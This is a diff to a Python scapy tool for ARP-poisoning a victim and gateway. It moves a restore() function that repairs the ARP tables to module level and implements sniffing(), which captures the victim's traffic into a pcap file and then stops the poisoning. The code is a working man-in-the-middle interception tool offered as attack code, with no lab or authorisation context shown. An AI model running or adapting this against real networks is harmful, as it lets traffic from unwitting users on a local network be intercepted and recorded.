@@ -105,14 +105,6 @@ def poisoning(victimIP, victimMac, gatewayIP, gatewayMac):
     print("-" * 60)
     print(colored("[+] Sending ARP poison packets to the victim and gateway", 'yellow', attrs=['bold']))
     print("-" * 60)
-    
-    def restore():
-        print(colored("[+] Getting back to normal state!", 'green', attrs=['bold']))
-        normal_victim_packet = scapy.ARP(psrc=gatewayIP, hwsrc=gatewayMac, pdst=victimIP, hwdst="ff:ff:ff:ff:ff:ff", op=2)
-        normal_gateway_packet = scapy.ARP(psrc=victimIP, hwsrc=victimMac, pdst=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", op=2)
-        for i in range(7):
-            scapy.send(normal_victim_packet, verbose=False)
-            scapy.send(normal_gateway_packet, verbose=False)
             
     while True:
         sys.stdout.flush()
@@ -126,8 +118,27 @@ def poisoning(victimIP, victimMac, gatewayIP, gatewayMac):
             time.sleep(2)
 
 def sniffing(packetCount, interface):
-    pass
+    global poisoning_process
     
+    time.sleep(3)
+    print('-' * 60)
+    print(colored("[-] Sniffing packets...", 'yellow', attrs=['bold']))
+    print('-' * 60)
+    
+    bpf_filter = f"ip host {victimIP}"
+    packets = scapy.sniff(count=packetCount, iface=interface, filter=bpf_filter)
+    scapy.wrpcap("poisoned_packets.pcap", packets)
+    poisoning_process.terminate()
+    restore()
+    print("[+] Finished , pcap file saved to poisoned_packets.pcap")
+
+def restore():
+    print(colored("[+] Getting back to normal state!", 'green', attrs=['bold']))
+    normal_victim_packet = scapy.ARP(psrc=gatewayIP, hwsrc=gatewayMac, pdst=victimIP, hwdst="ff:ff:ff:ff:ff:ff", op=2)
+    normal_gateway_packet = scapy.ARP(psrc=victimIP, hwsrc=victimMac, pdst=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", op=2)
+    for i in range(7):
+        scapy.send(normal_victim_packet, verbose=False)
+        scapy.send(normal_gateway_packet, verbose=False)    
 
 if __name__ == "__main__":
     arguments = get_args()
